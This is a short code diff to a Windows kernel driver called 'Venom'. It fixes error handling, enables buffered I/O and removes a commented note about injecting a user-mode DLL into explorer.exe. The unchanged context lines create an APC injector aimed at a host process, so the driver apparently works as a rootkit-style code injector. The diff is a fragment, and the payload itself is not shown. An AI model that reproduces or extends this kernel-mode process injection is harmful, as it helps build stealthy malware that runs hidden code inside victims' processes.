@@ -37,7 +37,11 @@ DriverEntry(_In_ PDRIVER_OBJECT DriverObject, _In_ PUNICODE_STRING RegistryPath)
 		if (deviceObject) {
 			IoDeleteDevice(deviceObject);
 		}
+
+		return status;
 	}
+
+	deviceObject->Flags |= DO_BUFFERED_IO;
 
 	DriverObject->DriverUnload = VenomUnload;
 	DriverObject->MajorFunction[IRP_MJ_CREATE] = DriverObject->MajorFunction[IRP_MJ_CLOSE] = VenomCreateClose;
@@ -48,8 +52,6 @@ DriverEntry(_In_ PDRIVER_OBJECT DriverObject, _In_ PUNICODE_STRING RegistryPath)
 	//	return status;
 	//}
 
-	// Inject user mode dll to explorer.exe
-	//UNICODE_STRING processName = RTL_CONSTANT_STRING(L"explorer.exe");
 	auto process = Process(VENOM_HOST_PROCESS);
 	auto apcInjector = APCInjector(process);
 
